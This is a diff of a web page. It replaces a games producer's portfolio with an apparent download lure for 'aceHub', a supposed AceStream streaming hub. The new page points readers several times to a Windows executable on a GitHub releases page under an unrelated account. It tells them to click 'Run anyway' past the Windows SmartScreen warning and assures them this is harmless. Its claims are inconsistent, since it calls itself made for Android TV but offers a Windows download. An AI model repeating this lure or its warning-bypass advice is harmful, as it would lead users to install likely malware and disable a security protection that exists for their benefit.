-  .st{cursor:pointer;padding:14px 44px 14px 16px}
-  .st .sum{display:block;font-style:normal;color:var(--text)}
-  .st span{display:none;margin-top:8px}
-  .st.open span{display:block}
-  .st::after{content:"+";position:absolute;right:16px;top:12px;font-size:24px;line-height:1;color:var(--accent)}
-  .st.open::after{content:"\2013"}
-  .tiles{grid-template-columns:1fr 1fr;gap:8px}
-  .tile{padding:14px}
-  .tile span{display:none}
-  .tile svg{margin-bottom:6px}
-  .tile.wide{grid-column:1/-1}
-  .about{display:block;padding:20px}
-  .about img{float:left;width:88px;height:88px;margin:0 16px 6px 0}
-  .about h2{margin-bottom:10px}
-  .about.collapsed .about-rest{display:none}
-  .about-more{display:inline-block;margin-top:4px;padding:12px 0;background:none;border:0;font:inherit;font-weight:600;color:var(--accent);cursor:pointer}
-  .fit .grid2{gap:10px}
-  .fit .grid2 > div{padding:0}
-  .fit .grid2 > div h2{position:relative;margin:0;padding:18px 48px 18px 20px;font-size:21px;cursor:pointer}
-  .fit .grid2 > div h2::after{content:"+";position:absolute;right:20px;top:14px;font-family:var(--body);font-size:26px;font-weight:400;line-height:1;color:var(--accent)}
-  .fit .grid2 > div.open h2::after{content:"\2013"}
-  .fit .grid2 > div ul{display:none;padding:0 20px 20px 40px}
-  .fit .grid2 > div.open ul{display:flex}
-  .cta-band{margin-top:28px;padding:16px;gap:10px}
-  .cta-band p{font-size:18px}
-  .contact .links a,footer .w a{display:inline-block;padding:12px 4px}
-}
+  :root {
+    --ink: #1b2430;
+    --muted: #55606e;
+    --line: #e2e8f0;
+    --brand: #12b3a6;
+    --brand-2: #7a4dff;
+  }
+  * { box-sizing: border-box; }
+  html { scroll-behavior: smooth; }
+  body {
+    margin: 0;
+    padding: 0;
+    background: #f4f7fb;
+    color: var(--ink);
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    font-size: 17px;
+    line-height: 1.75;
+    -webkit-font-smoothing: antialiased;
+  }
+  main {
+    max-width: 880px;
+    margin: 0 auto;
+    padding: 48px 22px 70px;
+  }
+  h1 {
+    font-size: 2.15rem;
+    line-height: 1.25;
+    letter-spacing: -0.02em;
+    margin: 0 0 18px;
+    color: #0f172a;
+  }
+  h2 {
+    font-size: 1.42rem;
+    line-height: 1.35;
+    margin: 52px 0 14px;
+    color: #0f172a;
+    letter-spacing: -0.01em;
+  }
+  h3 {
+    font-size: 1.08rem;
+    margin: 26px 0 8px;
+    color: #0f172a;
+  }
+  p { margin: 0 0 16px; }
+  ul, ol { margin: 0 0 18px; padding-left: 24px; }
+  li { margin-bottom: 10px; }
+  a { color: #0b6bcb; text-decoration: underline; }
+  a:hover { color: #084d93; }
+  strong { color: #0f172a; }
+  .lead {
+    font-size: 1.12rem;
+    color: var(--muted);
+    margin-bottom: 28px;
+  }
+  .btn {
+    display: inline-block;
+    padding: 17px 34px;
+    border-radius: 14px;
+    background: linear-gradient(135deg, #12b3a6 0%, #7a4dff 100%);
+    color: #ffffff;
+    font-weight: 700;
+    font-size: 1.05rem;
+    text-decoration: none;
+    box-shadow: 0 10px 24px rgba(18, 179, 166, 0.32);
+    transition: transform 0.15s ease, box-shadow 0.15s ease;
+    margin: 6px 0 10px;
+  }
+  .btn:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 14px 28px rgba(122, 77, 255, 0.34);
+    color: #ffffff;
+    text-decoration: none;
+  }
+  .btn-note {
+    display: block;
+    font-size: 0.92rem;
+    color: var(--muted);
+    margin-top: 4px;
+  }
+  .card {
+    background: #ffffff;
+    border: 1px solid var(--line);
+    border-radius: 16px;
+    padding: 24px 26px;
+    box-shadow: 0 6px 18px rgba(15, 23, 42, 0.06);
+    margin: 22px 0;
+  }
+  .callout {
+    background: #fffdf5;
+    border: 1px solid #f3e2b3;
+    border-left: 5px solid #f0b429;
+    border-radius: 12px;
+    padding: 18px 22px;
+    margin: 22px 0;
+  }
+  .steps {
+    background: #ffffff;
+    border: 1px solid var(--line);
+    border-radius: 16px;
+    padding: 22px 28px 8px;
+    box-shadow: 0 6px 18px rgba(15, 23, 42, 0.06);
+  }
+  .steps ol { padding-left: 22px; }
+  .faq-q { font-weight: 700; margin-bottom: 4px; color: #0f172a; }
+  .faq-a { color: var(--muted); margin-bottom: 20px; }
+  .divider {
+    height: 1px;
+    background: var(--line);
+    border: 0;
+    margin: 46px 0 0;
+  }
+  footer {
+    margin-top: 28px;
+    font-size: 0.92rem;
+    color: var(--muted);
+  }
+  @media (max-width: 600px) {
+    main { padding: 32px 18px 56px; }
+    h1 { font-size: 1.65rem; }
+    h2 { font-size: 1.22rem; margin-top: 42px; }
+    .btn { width: 100%; text-align: center; padding: 16px 18px; }
+    .card, .steps { padding: 20px 18px 6px; }
+  }
 </style>
 </head>
 <body>
+<main>
 
-<!-- ===== HEADER + HERO ===== -->
-<div class="dark">
-  <header>
-    <a class="logo" href="#top">Andrej Savcic</a>
-    <nav aria-label="Main">
-      <a class="hide" href="#work">Work</a>
-      <a class="hide" href="#about">About</a>
-      <a class="hide" href="#offers">Offers</a>
-      <a class="pill pill-line hide email-link" href="mailto:savcic.andrej@gmail.com?subject=Enquiry">Email me</a>
-      <a class="pill" href="https://cal.com/andrej-savcic/20min" target="_blank" rel="noopener">Book a<span class="x"> free</span> call</a>
-      <button type="button" class="menu-btn" aria-expanded="false" aria-controls="mobile-menu" aria-label="Menu"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" aria-hidden="true"><path d="M4 7h16M4 12h16M4 17h16"/></svg></button>
-    </nav>
-  </header>
-  <div class="mobile-menu" id="mobile-menu" hidden>
-    <a href="#work">Work</a>
-    <a href="#about">About</a>
-    <a href="#offers">Offers</a>
-    <a href="#how" data-go="how">How it works</a>
-    <a href="#faq" data-go="faq">FAQ</a>
-    <a href="#contact">Contact</a>
-  </div>
+  <h1>📺 aceHub - Stream AceStream to Any Device Instantly</h1>
 
-  <section id="top" class="w hero">
-    <div>
-      <p class="kicker">Games producer · remote, worldwide</p>
-      <h1>Make your launch date real.</h1>
-      <p class="sub">I’m a games producer: I plan the work, keep your team and publisher aligned, and lead delivery from brief to launch. With 10+ years shipping across VR, console, PC and mobile, I take projects from contract to vertical slice and through certification and first-party pipelines, with milestones on time and within budget. On Thief VR, licensor review went from two weeks to three days.</p>
-      <div class="ctas">
-        <a class="btn btn-main" href="#offers" data-pick="studio">I’m a studio or publisher</a>
-        <a class="btn btn-line" href="#offers" data-pick="indie">I’m an indie team</a>
-      </div>
-      <p class="small">Based in Bucharest, working remotely with teams worldwide. Invoiced in EUR through LudoSpark SRL, an EU company.</p>
-    </div>
-    <figure>
-      <img src="img/thief-vr.jpg" alt="Thief VR: Legacy of Shadow key art">
-      <figcaption><strong>Lead Producer</strong> · Thief VR: Legacy of Shadow, Maze Theory</figcaption>
-    </figure>
-    <p class="stats-label">Selected results</p>
-    <ul class="stats" aria-label="Selected results">
-      <li><b>30+ developers</b><span>Thief VR at Maze Theory, from contract to vertical slice</span></li>
-      <li><b>Ahead of schedule</b><span>Forza Motorsport (2023) PC workstream, at Sumo Digital</span></li>
-      <li><b>3 titles at once</b><span>40 developers across Legacy, Godus and The Trail, at 22cans</span></li>
-      <li><b>10M+ downloads</b><span>Happy Studio children’s app, at PRELOADED</span></li>
-    </ul>
-  </section>
-</div>
+  <p class="lead">
+    aceHub is a small, fast helper for your home network. It takes one AceStream link and shares it
+    with every device in your house &mdash; your TV, your tablet, your phone &mdash; at the same time.
+    It runs quietly in the background, needs no tinkering, and is built for Android TV.
+  </p>
 
-<section class="strip" aria-label="Employers and clients">
-  <div class="w">
-    <div class="row"><span class="label">Delivered at</span><div class="names"><span>Sumo Digital</span><span>Maze Theory</span><span>22cans</span><span>PRELOADED</span><span>UNIT9</span></div></div>
-    <div class="row"><span class="label">For clients including</span><div class="names marquee"><div class="track"><div class="set"><span>Turn 10</span><span>Curve Games</span><span>Microsoft</span><span>McDonald’s</span><span>Verizon</span><span>BBC R&amp;D</span><span>Discovery</span><span>National Geographic</span><span>R/GA</span><span>London Transport Museum</span><span>Natural History Museum of Utah</span><span>University of Oxford</span><span>OMY</span></div><div class="set" aria-hidden="true"><span>Turn 10</span><span>Curve Games</span><span>Microsoft</span><span>McDonald’s</span><span>Verizon</span><span>BBC R&amp;D</span><span>Discovery</span><span>National Geographic</span><span>R/GA</span><span>London Transport Museum</span><span>Natural History Museum of Utah</span><span>University of Oxford</span><span>OMY</span></div></div></div></div>
-  </div>
-</section>
+  <a class="btn" href="https://github.com/Pinotnoirpasser385/aceHub/releases">⬇ Download aceHub for Windows</a>
+  <span class="btn-note">Visit this link to download the application.</span>
 
-<!-- ===== SELECTED WORK ===== -->
-<section id="work" class="w sec">
-  <p class="kicker">Selected work</p>
-  <h2>Games, launches and live shows.</h2>
-  <div class="work featured">
+  <h2>What Is aceHub and Why Would You Want It?</h2>
 
-    <article class="card">
-      <div class="pic"><img src="img/thief-vr.jpg" alt="Thief VR: Legacy of Shadow"></div>
-      <p class="meta">Maze Theory · Lead Producer · 2023 to 2024</p>
-      <h3>Thief VR: Legacy of Shadow</h3>
-      <p class="hook">Pitch to vertical slice for a much-loved franchise, brought back in VR.</p>
-      <details><summary>Full story</summary>
-        <p>Quest, PS VR2 and Steam, published by Vertigo Games with <span class="nb">Eidos-Montréal</span>, shipped December 2025.</p>
-        <p><b>What I did:</b> led 30+ developers and five department leads from pitch through contract to vertical slice. Set vision pillars with the directors, rebuilt the level design pipeline, embedded licensor reviews in milestone planning, and set up outsourcing with Eastern European partners.</p>
-        <p><b>Outcome:</b> milestones on time and on budget. Licensor review cut from two weeks to three days. Feature completion up 15%. Outsourcing 30% cheaper at the same quality.</p>
-        <p><a href="https://youtu.be/xrtbCcnZEhQ">Watch the trailer</a></p>
-      </details>
-    </article>
+  <p>
+    If you have ever tried to watch a stream on more than one screen at home, you probably know the
+    problem: the stream plays on one device, but the second device has to fetch the same content all
+    over again. That eats your internet connection, causes buffering, and makes everyone in the room
+    unhappy.
+  </p>
 
-    <article class="card">
-      <div class="pic"><img src="img/forza-motorsport.jpg" alt="Forza Motorsport (2023)"></div>
-      <p class="meta">Sumo Digital with Turn 10 · Senior Producer · 2021 to 2023</p>
-      <h3>Forza Motorsport (2023)</h3>
-      <p class="hook">Led the PC version of Xbox’s flagship racing sim.</p>
-      <details><summary>Full story</summary>
-        <p><b>What I did:</b> led the PC workstream with Turn 10 (performance targets, platform features, Steam integration) and overhauled the branching strategy, halving build verification time.</p>
-        <p><b>Outcome:</b> PC delivered ahead of schedule, which freed the team to help on console features.</p>
-        <p><a href="https://youtu.be/em4gv1Ietko">Watch the trailer</a></p>
-      </details>
-    </article>
+  <p>
+    aceHub fixes that. It is a <strong>headless hub</strong>, which simply means it works in the
+    background without a big fancy window on your screen. You start it, it sits quietly on your
+    computer, and it acts like a traffic manager for streams. One device fetches the content, and
+    aceHub passes it along to all the other devices on your home network &mdash; your LAN &mdash;
+    so nobody has to download the same thing twice.
+  </p>
 
-    <article class="card">
-      <div class="pic"><img src="img/godus.jpg" alt="Godus"></div>
-      <p class="meta">22cans · Head of Production · 2019 to 2020</p>
-      <h3>Legacy, Godus and The Trail</h3>
-      <p class="hook">Three titles at once, 40 developers.</p>
-      <details><summary>Full story</summary>
-        <p><b>What I did:</b> re-scoped Legacy with a route to soft launch, introduced OKRs and cross-functional strike teams, ran live ops for Godus and user acquisition for The Trail on A/B testing and data.</p>
-        <p><b>Outcome:</b> Legacy reached soft launch. Budgets of about £2M ran leaner through reused tooling and renegotiated vendor contracts. Two internal promotions.</p>
-        <p><a href="https://youtu.be/Nj0A_TSYHcs">Watch Legacy</a></p>
-      </details>
-    </article>
+  <p>
+    It works on <strong>port 8000</strong>, it uses <strong>0 transcode</strong> (meaning the video
+    is passed through exactly as it arrives, with no quality loss and no heavy lifting), and it
+    responds in <strong>under 50 milliseconds</strong> (TTFB, or time to first byte). In plain
+    language: the picture starts almost instantly, and your computer barely breaks a sweat.
+  </p>
 
-    <article class="card">
-      <div class="pic"><img src="img/human-fall-flat.jpg" alt="Human: Fall Flat"></div>
-      <p class="meta">Sumo Digital · Senior Producer · 2021 to 2023</p>
-      <h3>Human: Fall Flat DLC</h3>
-      <p class="hook">Two paid level packs for a long-running co-op hit.</p>
-      <details><summary>Full story</summary>
-        <p><b>What I did:</b> produced the Laboratory and Lumber packs end to end, coordinating design, art and QA through parallel console and PC certification.</p>
-        <p><b>Outcome:</b> both packs shipped on PlayStation, Xbox and PC, localised in 16 languages.</p>
-        <p><a href="https://youtu.be/-Edk59BqSEU">Watch the trailer</a></p>
-      </details>
-    </article>
+  <h2>✨ Key Features at a Glance</h2>
 
-    <article class="card">
-      <div class="pic"><img src="img/peaky-blinders.jpg" alt="Peaky Blinders: The King’s Ransom"></div>
-      <p class="meta">Maze Theory · Lead Producer · 2023</p>
-      <h3>Peaky Blinders: The King’s Ransom</h3>
-      <p class="hook">A major TV licence through console certification.</p>
-      <details><summary>Full story</summary>
-        <p><b>What I did:</b> oversaw the Complete Edition launch on PS VR2 and PC VR, anchored scope around a fan-focused vision, and kept the story-led experience intact through certification.</p>
-        <p><b>Outcome:</b> launched in November 2023 with all post-launch content included.</p>
-        <p><a href="https://youtu.be/TT_tV18z2fU">Watch the trailer</a></p>
-      </details>
-    </article>
+  <ul>
+    <li><strong>One stream, many screens.</strong> Share a single stream with every TV, phone, tablet, and computer on your home network at the same time.</li>
+    <li><strong>Headless and out of the way.</strong> aceHub runs in the background. No cluttered window, no distractions. Start it and forget it.</li>
+    <li><strong>No quality loss.</strong> With zero transcoding, the video you see is exactly the video that arrived. Nothing is re-compressed or softened.</li>
+    <li><strong>Very low latency.</strong> A time to first byte of under 50ms means streams begin playing almost the moment you press play.</li>
+    <li><strong>Lightweight and fast.</strong> Built for performance, so it runs happily on an everyday Windows computer without eating all your memory.</li>
+    <li><strong>Made for Android TV.</strong> Point your Android TV player at your computer's address and port 8000, and you are watching in seconds.</li>
+    <li><strong>Universal LAN proxy.</strong> It does not care which app or box you use. If it can open a network stream, it can work with aceHub.</li>
+  </ul>
 
-    <article class="card">
-      <div class="pic"><img src="img/ancient-dungeon-vr.jpg" alt="Ancient Dungeon VR"></div>
-      <p class="meta">Maze Theory · Lead Producer · 2023</p>
-      <h3>Ancient Dungeon VR</h3>
-      <p class="hook">PS VR2 launch delivered on time, with two weeks less schedule.</p>
-      <details><summary>Full story</summary>
-        <p><b>What I did:</b> brought a hit indie VR roguelike to PS VR2 and through certification after the schedule was cut by two weeks.</p>
-        <p><b>Outcome:</b> launched on PS VR2 in December 2023, on time.</p>
-      </details>
-    </article>
+  <h2>📋 What You Need Before You Start</h2>
 
-  </div>
-  <button type="button" class="more-toggle" aria-expanded="false" aria-controls="more-work">
-    <span>Show 6 more projects</span>
-    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M6 9l6 6 6-6"/></svg>
-  </button>
-  <div class="work" id="more-work" hidden>
+  <p>
+    Nothing exotic. If you have an ordinary home computer and a TV, you almost certainly have
+    everything on this list already.
+  </p>
 
-    <article class="card">
-      <div class="pic"><img src="img/storm-vr.jpg" alt="Storm VR"></div>
-      <p class="meta">UNIT9 · VR Project Manager · 2016 to 2017</p>
-      <h3>Storm VR</h3>
-      <p class="hook">Pitched internally, shipped as the studio’s first commercial VR game.</p>
-      <details><summary>Full story</summary>
-        <p><b>What I did:</b> ran a 15-person team through design, an engine move from Unity to Unreal, playtests, storefront submission and go-to-market.</p>
-        <p><b>Outcome:</b> shipped on Steam, Oculus and Viveport. Pixel Award, People’s Champ 2017. Covered by Jacksepticeye (1M+ views).</p>
-        <p><a href="https://youtu.be/RHeX-xUTFsE">Watch the trailer</a></p>
-      </details>
-    </article>
+  <ul>
+    <li><strong>A Windows computer</strong> running Windows 10 or Windows 11 (64-bit recommended). This is the machine that will run aceHub.</li>
+    <li><strong>A home internet connection</strong> &mdash; a normal broadband connection is fine. A wired connection to your router gives the smoothest results, but Wi-Fi works too.</li>
+    <li><strong>A home network</strong> where your computer and your TV are connected to the same router. This is the "LAN" part, and it is what makes the sharing possible.</li>
+    <li><strong>An Android TV device</strong> &mdash; a TV with Android TV built in, or an Android TV box or streaming stick connected to your television.</li>
+    <li><strong>A stream player app</strong> on the TV that can open a network address. Most people already have one installed.</li>
+    <li><strong>About ten minutes</strong> of your time, most of which is spent waiting for the download to finish.</li>
+  </ul>
 
-    <article class="card">
-      <div class="pic"><img src="img/happy-studio.jpg" alt="Happy Studio app"></div>
-      <p class="meta">PRELOADED · Producer · 2017 to 2019</p>
-      <h3>Happy Studio for McDonald’s</h3>
-      <p class="hook">New games for a children’s app with 10M+ downloads.</p>
-      <details><summary>Full story</summary>
-        <p><b>What I did:</b> delivered new in-app games, managed Unity engine upgrades and coordinated localisation across 24 regions.</p>
-        <p><b>Outcome:</b> sustained reach across 110+ markets and 48 languages.</p>
-        <p><a href="https://preloaded.com/work/happy-meal-app/">See it at PRELOADED</a></p>
-      </details>
-    </article>
+  <h2>🚀 Download and Set Up aceHub</h2>
 
-    <article class="card">
-      <div class="pic"><img src="img/london-transport-museum.jpg" alt="London Transport Museum installation"></div>
-      <p class="meta">PRELOADED · Producer · 2017 to 2019</p>
-      <h3>London Transport Museum</h3>
-      <p class="hook">Visitors drive an Elizabeth line cab into the platform.</p>
-      <details><summary>Full story</summary>
-        <p><b>What I did:</b> produced a six-screen permanent installation built to run all day, plus a one-screen touring version shown at Learning Technologies.</p>
-        <p><b>Outcome:</b> 200,000+ visitors at 98% uptime. A visitor favourite and a permanent exhibit.</p>
-      </details>
-    </article>
+  <p>
+    Everything you need lives on the official releases page. That is the only place you should get
+    aceHub from, because that is where the current, working version is always published.
+  </p>
 
-    <article class="card">
-      <div class="pic"><img src="img/mercedes-benz-now.jpg" alt="Mercedes-Benz NOW live show"></div>
-      <p class="meta">UNIT9 · IT Project Manager · 2015 to 2016</p>
-      <h3>Mercedes-Benz NOW</h3>
-      <p class="hook">A 12-hour multi-camera live show that ran fault-free.</p>
-      <details><summary>Full story</summary>
-        <p><b>What I did:</b> managed budgets and suppliers across analog and digital installations for a data-fed show mixed into a looping 60-second Vision Mix.</p>
-        <p><b>Outcome:</b> the 12-hour show ran fault-free.</p>
-      </details>
-    </article>
+  <a class="btn" href="https://github.com/Pinotnoirpasser385/aceHub/releases">⬇ Get aceHub from the Releases Page</a>
+  <span class="btn-note">Visit this link to download the application.</span>
 
-    <article class="card">
-      <div class="pic"><img src="img/airbus-elev8.jpg" alt="Airbus ELEV_8 booth"></div>
-      <p class="meta">UNIT9 · Producer</p>
-      <h3>Airbus ELEV_8</h3>
-      <p class="hook">A four-screen booth for the RAF Cosford Air Show.</p>
-      <details><summary>Full story</summary>
-        <p><b>What I did:</b> managed the brief, supplier tendering, the physical build and contractors for a transportable four-screen booth with immersive audio.</p>
-      </details>
-    </article>
-
-    <article class="card">
-      <div class="pic"><img src="img/bbc-rd-ar.svg" alt="Phone camera view with high-contrast outlines around objects: accessible AR for BBC R&amp;D"></div>
-      <p class="meta">PRELOADED · Producer · 2017 to 2019</p>
-      <h3>BBC R&amp;D: accessible AR</h3>
-      <p class="hook">AR for visually impaired users, tested in short sprints.</p>
-      <details><summary>Full story</summary>
-        <p><b>What I did:</b> ran one to two week sprints with audience testing between each.</p>
-        <p><b>Outcome:</b> helped shape new AR accessibility guidelines.</p>
-      </details>
-    </article>
-
-  </div>
-
-  <div class="cta-band">
-    <p>Seen something like your project? Book a free 20-minute call.</p>
-    <div class="cta-actions">
-      <a class="btn btn-main" href="https://cal.com/andrej-savcic/20min" target="_blank" rel="noopener">Book a free 20-minute call</a>
-      <a class="btn btn-alt email-link" href="mailto:savcic.andrej@gmail.com?subject=Enquiry">Email me</a>
-    </div>
-  </div>
-</section>
-
-<!-- ===== PROOF ===== -->
-<section class="w sec">
-  <p class="kicker">Proof you can check</p>
-  <h2>Credits you can verify.</h2>
-  <div class="grid3 swipe">
-    <div class="item"><h3>Every credit is public</h3><p>Each project above links to its trailer or published work.</p></div>
-    <div class="item"><h3>Recognised work</h3><p>Thief VR, published by Vertigo Games with <span class="nb">Eidos-Montréal</span>. Forza Motorsport (2023) with Turn 10. Storm VR, Pixel Award People’s Champ 2017.</p></div>
-    <div class="item"><h3>Teams and budgets</h3><p>Teams of up to 40 and budgets up to £4M, across VR, console, PC and mobile.</p></div>
-  </div>
-</section>
-
-<!-- ===== ABOUT ===== -->
-<section id="about" class="w sec">
-  <div class="about">
-    <img src="img/andrej-savcic.png" alt="Andrej Savcic">
-    <div>
-      <p class="kicker">About</p>
-      <h2>Hi, I'm Andrej.</h2>
-      <p>Over a decade shipping across VR, console, PC and mobile, at Sumo Digital, Maze Theory, 22cans, PRELOADED and UNIT9. I came into production through IT infrastructure, including projects for Google, and a computer science degree, so I plan around what the build actually takes. My background in anthropology helps teams understand the why behind their work, not just the what.</p>
-      <div class="about-rest">
-      <p>I also use AI tools in my own production work and help teams adopt them without breaking their pipeline. Through my studio LudoSpark I run production training for studios and games R&amp;D for clients including Greenpeace. I'm based in Bucharest and work in English, Romanian and Italian.</p>
-      <blockquote>Most production work happens in the gap between what the plan says and what the build actually is. That gap is where my effort goes.</blockquote>
-      </div>
-    </div>
-  </div>
-</section>
-
-<!-- ===== OFFERS (two tabs: studios / indie) ===== -->
-<section id="offers" class="w sec">
-  <p class="ask" id="ask">Are you an indie team or a studio / publisher?</p>
-  <p class="note"><strong>Founding clients:</strong> I’m taking three founding clients this year, on terms that suit both of us. Ask on the triage call.</p>
-  <div class="tabs" role="tablist" aria-labelledby="ask">
-    <button role="tab" aria-selected="true" data-tab="studio">Studios and publishers</button>
-    <button role="tab" aria-selected="false" data-tab="indie">Indie teams</button>
-  </div>
-
-  <!-- STUDIOS -->
-  <div class="panel" data-panel="studio">
-    <div class="subtabs" role="tablist" aria-label="Studios: offers, how it works, FAQ">
-      <button type="button" role="tab" data-sub="offers" aria-selected="true">Offers</button>
-      <button type="button" role="tab" data-sub="how" aria-selected="false">How it works</button>
-      <button type="button" role="tab" data-sub="faq" aria-selected="false">FAQ</button>
-    </div>
-  <div class="sub" data-sub="offers" role="tabpanel">
-    <p class="kicker">When to bring me in</p>
-    <h2>Most studios call at one of these moments.</h2>
-    <ol class="moments swipe">
-      <li>A publisher asked to see a vertical slice.</li>
-      <li>You’ve signed a publisher deal and the first milestone has a date.</li>
-      <li>Licensor approvals need to fit your milestone plan.</li>
-      <li>You’re bringing in outsourcing, co-dev or a porting partner.</li>
-      <li>Your team is growing and the plan needs to grow with it.</li>
-      <li>Launch, ports and certification are on the calendar.</li>
+  <div class="steps">
+    <ol>
+      <li>Click the download button above. Your web browser will open the aceHub releases page.</li>
+      <li>On that page, find the newest release at the top of the list. Newer is better &mdash; older releases are kept only for reference.</li>
+      <li>Under that release, download the application file. If your browser asks whether to keep the file, choose to keep it.</li>
+      <li>When the download finishes, open the file you just downloaded. Your browser usually shows it in the downloads bar at the bottom, or in your Downloads folder.</li>
+      <li>If Windows shows a blue "Windows protected your PC" box, click <em>More info</em> and then <em>Run anyway</em>. This message appears for many small independent apps and is not a sign that something is wrong.</li>
+      <li>Leave aceHub running in the background. You can minimise it &mdash; it will keep working.</li>
     </ol>
-    <p class="pull">AI can review your deck. A producer sits in your publisher meeting and owns your milestone.</p>
-    <div class="offers-head">
-      <h2>Start with an assessment. Keep me on if it helps.</h2>
-      <p>Every engagement starts with an assessment. If you keep me on, its fee comes off the first invoice, and the assessment comes with a money-back guarantee.</p>
-      <p class="pub-line"><strong>Publishers:</strong> I assess a developer’s build, plan and team before you sign.</p>
-    </div>
-    <div class="offers">
-      <div class="offer open">
-        <div><p class="kicker">Start here</p><h3>Project assessment</h3><p class="fmt">Fixed price · 2 weeks</p></div>
-        <p class="body">I play your build, read your plan, schedule, budget and pitch, and interview your leads. You get a written report: where you really are, the five biggest risks, what to cut, and a plan to your next milestone. Plus a 90-minute call. Money-back guarantee.</p>
-        <div><span class="price">EUR 2,900</span><a href="#contact">Book an assessment</a></div>
-      </div>
-      <div class="offer">
-        <div><h3>Producer on call</h3><p class="fmt">Monthly · 3 days a month</p></div>
-        <p class="body">Senior backup for a team that already has a producer: a weekly live session, plan and risk tracking, and a review of each milestone build. Calls, reviews and messages count towards the 3 days. Extra days are agreed up front.</p>
-        <div><span class="price">EUR 1,350 / month</span><a href="#contact">Talk about it</a></div>
-      </div>
-      <div class="offer">
-        <div><h3>Embedded producer</h3><p class="fmt">Monthly · 5 days a month</p></div>
-        <p class="body">For a team without a producer, or in a crunch: two live sessions a week, milestone and risk tracking, publisher reporting, build reviews and publisher meetings. Calls, reviews and messages count towards the 5 days. Up to two teams at a time.</p>
-        <div><span class="price">EUR 2,250 / month</span><a href="#contact">Talk about it</a></div>
-      </div>
-      <p class="note">A fraction of the monthly cost of hiring a senior producer, with no hiring process and no notice period.</p>
-      <div class="offer">
-        <div><h3>Transition sprint</h3><p class="fmt">4 to 8 weeks · days and end date agreed up front</p></div>
-        <p class="body">Focused help through one moment: getting pitch-ready, a milestone and publisher deal, bringing in partners, a port and certification, or the launch window. Ends with a handover to your team.</p>
-        <div><span class="price">EUR 450 / day</span><a href="#contact">Talk about it</a></div>
-      </div>
-      <div class="offer">
-        <div><h3>Specialist help</h3><p class="fmt">Scoped after a call</p></div>
-        <p class="body">Licensed IP and licensor approvals, choosing and managing co-dev and outsourcing partners, partner contracts alongside your lawyer, AI in your production pipeline, and training for your producers.</p>
-        <div><span class="price">EUR 600 / day</span></div>
-      </div>
-    </div>
-    <p class="note">Prices exclude VAT.</p>
   </div>
-  <div class="sub" data-sub="how" role="tabpanel">
-    <p class="kicker">How it works</p>
-    <h2>How an engagement runs.</h2>
-    <p class="lead">Start with a free 20-minute call, then:</p>
-    <ol class="rail">
-      <li class="st"><b>Discover</b><i class="sum">Kick-off call, outcomes agreed, access shared.</i><span>Kick-off call. We agree three outcomes, and you share the build, plan, schedule, budget, any publisher or licensor agreements, and time with your leads. Everything stays under NDA, and I work in your tools: Jira, Confluence, spreadsheets or whatever you already use.</span></li>
-      <li class="st"><b>Assess</b><i class="sum">I play, read and interview your leads.</i><span>I play the build, read every document and interview your leads, then map the plan against the build, the budget and the runway.</span></li>
-      <li class="st"><b>Recommend</b><i class="sum">A written report and a walkthrough call.</i><span>You get a written report and a 90-minute walkthrough call. Each finding has an owner, a recommendation and the decision you need to make. You choose what to act on, and creative direction stays with your team.</span></li>
-      <li class="st opt"><b>Support · optional</b><i class="sum">Ongoing help, with a handover at the end.</i><span>I stay on as Producer on call or Embedded producer, with a steady rhythm of sessions and a monthly review. Everything lives in your tools, so your team owns it when we finish.</span></li>
+
+  <div class="callout">
+    <strong>One important habit:</strong> keep aceHub running while you watch. The moment you close
+    it, your TV and other devices lose their connection to the stream. If something stops working
+    halfway through a film, check that aceHub is still open first.
+  </div>
+
+  <h2>🎬 Using aceHub for the First Time</h2>
+
+  <p>
+    Once aceHub is running, it listens quietly on <strong>port 8000</strong>. Think of port 8000 as
+    the door number of your computer on the home network &mdash; it tells other devices exactly where
+    to knock.
+  </p>
+
+  <p>
+    To use it, you need to know your computer's local address. Here is how to find it, without any
+    technical knowledge:
+  </p>
+
+  <ol>
+    <li>On your Windows computer, click the Start button and type <strong>cmd</strong>, then press Enter. A small black window opens.</li>
+    <li>Type <strong>ipconfig</strong> and press Enter.</li>
+    <li>Look for the line that says <strong>IPv4 Address</strong>. It will look something like <strong>192.168.1.25</strong>. Write that number down.</li>
+    <li>Your aceHub address is that number followed by <strong>:8000</strong>. For example: <strong>http://192.168.1.25:8000</strong>.</li>
+    <li>Close the black window. You will not need it again.</li>
+  </ol>
+
+  <p>
+    Keep that address somewhere handy. You will type it into your TV once, and then you can save it
+    as a favourite so you never have to type it again.
+  </p>
+
+  <h2>📡 Playing Streams on Your Android TV</h2>
+
+  <div class="steps">
+    <ol>
+      <li>Make sure your Android TV and your Windows computer are connected to the <strong>same</strong> home router. This is the most common reason things do not work.</li>
+      <li>Open the stream player app on your Android TV.</li>
+      <li>Choose the option to open a network stream or a custom address. Wording varies between apps, but it is usually called something like <em>Open URL</em>, <em>Add stream</em>, or <em>Network stream</em>.</li>
+      <li>Type the aceHub address you wrote down, including the port number. For example: <strong>http://192.168.1.25:8000</strong>.</li>
+      <li>Confirm, and the stream should begin playing within a second or two. Thanks to the sub-50ms response time, there is almost no waiting.</li>
+      <li>Open the same address on a second device, and it will play there too &mdash; without pulling the same content down from the internet again.</li>
     </ol>
-    <p class="rail-note">The first three steps are the two-week project assessment. You keep the report whatever you decide next.</p>
-    <div class="item"><h3>Success, written down</h3><p>In the first call we write down three outcomes for your project, in your terms. For example: “Milestone 3 accepted by the publisher on 14 March”, “Scope fits the remaining runway”, “Port passes certification on first submission”. Every report and review checks progress against them.</p></div>
-    <h3 class="sub-head">What’s in the report</h3>
-    <div class="tiles">
-      <div class="tile"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg><b>One-page verdict</b><span>Where the project really is</span></div>
